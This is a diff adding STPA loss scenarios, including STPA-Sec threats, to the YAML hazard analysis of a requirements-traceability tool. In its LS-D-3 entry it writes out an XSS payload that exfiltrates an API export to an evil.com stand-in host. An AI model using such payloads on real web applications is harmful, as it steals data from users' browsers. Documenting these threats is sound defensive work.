@@ -417,3 +417,283 @@ loss-scenarios:
       - No transactional write mechanism for bulk artifact updates
       - Partial writes are committed to the working tree immediately
       - No rollback capability for interrupted sync operations
+
+  # =========================================================================
+  # Incremental validation scenarios (UCA-C-10 through UCA-C-14)
+  # =========================================================================
+  - id: LS-C-5
+    title: Salsa input query not updated after file write
+    uca: UCA-C-10
+    type: inadequate-process-model
+    hazards: [H-9, H-1, H-3]
+    scenario: >
+      The developer edits an artifact YAML file and saves it to disk.
+      The salsa database's file-content input query was set when the
+      file was first read. Because there is no file-watcher or
+      explicit invalidation call between validation invocations in
+      the same process (e.g., during `rivet serve`), the salsa
+      database returns the cached parse result from the old file
+      contents [UCA-C-10]. The link graph and validation diagnostics
+      reflect the pre-edit state. The dashboard shows "0 errors"
+      while the file on disk contains broken links [H-1, H-3].
+    process-model-flaw: >
+      The salsa database believes its file-content input still
+      matches the on-disk content because no explicit set_file_content()
+      call was made after the file was modified externally.
+    causal-factors:
+      - No file-system watcher to detect external file modifications
+      - Salsa inputs are set once at load time, not refreshed
+      - Dashboard reload may not invalidate all salsa inputs
+
+  - id: LS-C-6
+    title: Conditional rule evaluation uses cached field values
+    uca: UCA-C-11
+    type: inadequate-process-model
+    hazards: [H-9, H-1]
+    scenario: >
+      A schema defines a conditional rule: "when status == approved,
+      verification-criteria is required." An artifact has status=draft
+      and no verification-criteria field. The salsa database caches
+      the rule evaluation result as "not applicable" (because
+      status != approved). The developer changes the artifact's status
+      to "approved" but does not add verification-criteria. Because
+      the salsa conditional-rule query depends only on the rule
+      definition (not the artifact's field values), the cached "not
+      applicable" result is returned [UCA-C-11]. The artifact passes
+      validation despite missing the required field [H-1].
+    process-model-flaw: >
+      The salsa query for conditional rule evaluation does not track
+      the artifact's field values as dependencies. It only depends
+      on the rule definition, so field value changes don't trigger
+      re-evaluation.
+    causal-factors:
+      - Conditional rule query does not declare artifact fields as inputs
+      - Salsa dependency tracking is opt-in per query
+      - No test verifies conditional rule re-evaluation after field change
+
+  - id: LS-C-7
+    title: Contradictory conditional rules not detected at schema load
+    uca: UCA-C-12
+    type: inadequate-control-algorithm
+    hazards: [H-10]
+    scenario: >
+      A project uses two schema files: the ASPICE schema requires
+      "verification-method" when status=approved, while a custom overlay
+      schema forbids "verification-method" when safety-level=QM (to
+      reduce overhead for non-safety items). An artifact with both
+      status=approved and safety-level=QM triggers both rules. The
+      schema merge algorithm does not check for rule conflicts [UCA-C-12].
+      The developer sees two contradictory validation errors and disables
+      one rule via a schema override, undermining the validation system.
+    causal-factors:
+      - Schema merge is purely additive (union of all rules)
+      - No SAT-solver or constraint check for rule compatibility
+      - Conditional rules lack a priority or override mechanism
+
+  - id: LS-C-8
+    title: Incremental validation diverges from full validation after rename
+    uca: UCA-C-13
+    type: inadequate-control-algorithm
+    hazards: [H-9, H-3]
+    scenario: >
+      A developer renames an artifact from REQ-042 to REQ-042a. The
+      salsa database invalidates the queries for the renamed artifact's
+      file. However, other artifacts that link to REQ-042 are in
+      different files whose salsa inputs have not changed. The
+      incremental validation for those files returns cached "valid"
+      results that still show links to REQ-042 as resolved [UCA-C-13].
+      A full validation would detect the broken links. The dashboard
+      shows 0 errors while a clean `rivet validate` shows 3 broken
+      links.
+    causal-factors:
+      - Link resolution queries depend on the link graph, not individual files
+      - Salsa does not track cross-file artifact ID dependencies
+      - No periodic full-revalidation check is implemented
+
+  - id: LS-C-9
+    title: Schema loading races with conditional rule evaluation
+    uca: UCA-C-14
+    type: inadequate-control-algorithm
+    hazards: [H-9, H-10]
+    scenario: >
+      The project loads schemas from three files: common.yaml,
+      dev.yaml, and custom-overlay.yaml. The salsa query graph allows
+      conditional rule evaluation to begin as soon as two schemas are
+      merged (common + dev), before the overlay is loaded. The overlay
+      adds a conditional rule that restricts certain field combinations.
+      Artifacts evaluated before the overlay loads pass validation
+      [UCA-C-14]. After the overlay loads, those same artifacts would
+      fail. The final validation result depends on evaluation order,
+      making it non-deterministic.
+    causal-factors:
+      - Schema merge is incremental (file-by-file) rather than all-at-once
+      - No barrier between "all schemas loaded" and "evaluation begins"
+      - Salsa query ordering is determined by demand, not explicit sequencing
+
+  # =========================================================================
+  # Parser scenarios (UCA-C-15 through UCA-C-17)
+  # =========================================================================
+  - id: LS-C-10
+    title: Parser extracts registry version instead of git_override commit
+    uca: UCA-C-15
+    type: inadequate-control-algorithm
+    hazards: [H-11, H-1]
+    scenario: >
+      A MODULE.bazel file declares `bazel_dep(name="meld", version="2.0")`
+      and separately `git_override(module_name="meld", commit="abc123")`.
+      The parser extracts the bazel_dep declaration and records
+      meld@2.0. It does not process the git_override because the
+      function name is not in its recognized set [UCA-C-15]. Cross-repo
+      validation loads meld@2.0 from the registry cache instead of
+      the pinned commit abc123. The traceability data comes from the
+      wrong version of meld, and coverage results are meaningless [H-1].
+    causal-factors:
+      - Parser's function recognition list is incomplete
+      - git_override is parsed separately from bazel_dep with no linkage
+      - No test covers the override-applies-to-dep scenario
+
+  - id: LS-C-11
+    title: Parser silently skips load() statement containing dependency
+    uca: UCA-C-16
+    type: inadequate-control-algorithm
+    hazards: [H-11]
+    scenario: >
+      A MODULE.bazel file uses `load("@rules_rust//rust:defs.bzl", "rust_library")`
+      followed by a macro call that declares additional bazel_deps.
+      The parser does not recognize load() statements and silently
+      skips the line [UCA-C-16]. The macro-declared dependencies are
+      invisible to Rivet. Cross-repo links to artifacts in those
+      repos are reported as broken when they actually exist in the
+      undiscovered external repos.
+    causal-factors:
+      - Starlark load() support is not implemented
+      - Parser treats unrecognized lines as comments
+      - No diagnostic emitted for skipped lines
+
+  - id: LS-C-12
+    title: Parser swaps keyword argument name and value
+    uca: UCA-C-17
+    type: inadequate-control-algorithm
+    hazards: [H-11, H-1]
+    scenario: >
+      A MODULE.bazel file contains `bazel_dep(version="1.0", name="meld")`.
+      The parser assumes positional argument order (name first, version
+      second) rather than parsing keyword arguments [UCA-C-17]. It
+      extracts name="1.0" and version="meld". The dependency is
+      recorded with the wrong module name, causing cross-repo
+      resolution to fail silently or resolve against the wrong repo.
+    causal-factors:
+      - Parser uses positional extraction rather than keyword matching
+      - No unit test for non-standard argument ordering
+      - CST construction assumes a fixed parameter order
+
+  # =========================================================================
+  # New UCA scenarios (STPA-Sec extension)
+  # =========================================================================
+  - id: LS-D-3
+    title: Artifact description XSS via dashboard rendering
+    uca: UCA-D-3
+    type: inadequate-control-algorithm
+    hazards: [H-13]
+    scenario: >
+      A developer creates an artifact with description containing
+      `<img src=x onerror="fetch('/api/export').then(r=>r.text()).then(d=>fetch('https://evil.com/?data='+btoa(d)))">`.
+      The dashboard's artifact detail view renders this description
+      by calling html_escape() on the description string. However,
+      the html_escape function in document.rs is only called for
+      markdown inline text, not for the artifact detail view in
+      serve.rs, which may interpolate the description directly into
+      HTML. The script executes in the auditor's browser, exfiltrating
+      the current traceability view [H-13, L-2, L-3].
+    causal-factors:
+      - Multiple rendering paths with inconsistent escaping
+      - serve.rs generates HTML via string formatting, not a template engine
+      - No Content-Security-Policy header to mitigate XSS
+
+  - id: LS-C-13
+    title: WASM adapter returns fabricated artifacts
+    uca: UCA-C-21
+    type: inadequate-process-model
+    hazards: [H-14]
+    scenario: >
+      A WASM adapter component is loaded from a .wasm file distributed
+      as a binary. The adapter's import() function is called with a
+      ReqIF source file containing 50 SpecObjects. The adapter returns
+      80 artifacts — the original 50 plus 30 fabricated artifacts with
+      valid-looking IDs (REQ-051 through REQ-080) that link to
+      existing requirements, inflating coverage metrics [UCA-C-21].
+      The host has no way to verify the count because the source data
+      format is adapter-specific. Schema validation passes because the
+      fabricated artifacts have valid types and fields.
+    process-model-flaw: >
+      The host trusts that the adapter's output faithfully represents
+      the source data. There is no independent verification mechanism
+      because the host cannot parse the adapter-specific source format.
+    causal-factors:
+      - WASM adapter output is trusted without independent verification
+      - No artifact-count or hash-based integrity check on adapter output
+      - Binary WASM components cannot be source-reviewed by users
+
+  - id: LS-C-14
+    title: Commit trailer false positive from non-artifact ID
+    uca: UCA-C-18
+    type: inadequate-control-algorithm
+    hazards: [H-15]
+    scenario: >
+      A commit message contains the trailer "Refs: ISO-26262, MISRA-C2012".
+      The is_artifact_id() function matches any string with uppercase
+      prefix + hyphen + digits. "ISO-26262" matches (prefix="ISO",
+      suffix="26262") and is extracted as an artifact reference [UCA-C-18].
+      The store does not contain "ISO-26262", so it is counted as a
+      broken reference. However, in the commit analysis summary, it
+      inflates the "linked commits" count because the commit has at
+      least one artifact reference (even though it's a false positive).
+    causal-factors:
+      - is_artifact_id() uses an overly broad pattern
+      - No validation against the actual artifact store during extraction
+      - Standard identifiers (ISO numbers, MISRA rules) match the pattern
+
+  - id: LS-L-3
+    title: Git clone executes malicious post-checkout hook
+    uca: UCA-L-6
+    type: control-path
+    hazards: [H-17]
+    scenario: >
+      An attacker submits a PR that modifies rivet.yaml to add an
+      external dependency pointing to a malicious git repository.
+      The repository contains a .git/hooks/post-checkout script that
+      exfiltrates SSH keys or modifies local source files. A reviewer
+      approves the PR without noticing the rivet.yaml change. When
+      any developer runs `rivet sync`, git clones the malicious repo
+      and the post-checkout hook executes with the developer's
+      permissions [UCA-L-6].
+    causal-factors:
+      - rivet.yaml changes are not flagged as security-sensitive in review
+      - git clone enables hooks by default
+      - No URL allowlist or domain restriction for external repos
+      - sync command does not use --config core.hooksPath=/dev/null
+
+  - id: LS-C-15
+    title: Lifecycle check misses cybersecurity downstream requirements
+    uca: UCA-C-24
+    type: inadequate-process-model
+    hazards: [H-3, H-1]
+    scenario: >
+      A project uses the cybersecurity schema with threat-scenario,
+      countermeasure, and cybersecurity-requirement types. The
+      lifecycle completeness check in lifecycle.rs only knows about
+      requirement -> [feature, aadl-component, design-decision]
+      mappings. Cybersecurity requirements have no expected downstream
+      types in the hardcoded map [UCA-C-24]. The lifecycle gap analysis
+      reports 0 gaps for cybersecurity requirements, even though none
+      have countermeasure links. The safety engineer trusts the
+      lifecycle check and misses genuine coverage gaps.
+    process-model-flaw: >
+      The lifecycle module's process model is hardcoded to the dev
+      schema's traceability chain, not derived from the loaded schema's
+      traceability rules. It does not know about cybersecurity or STPA
+      type hierarchies.
+    causal-factors:
+      - expected_downstream() is hardcoded, not derived from schema rules
+      - No test covers lifecycle checks with non-dev schemas
+      - The module was written for the dev schema and not generalized
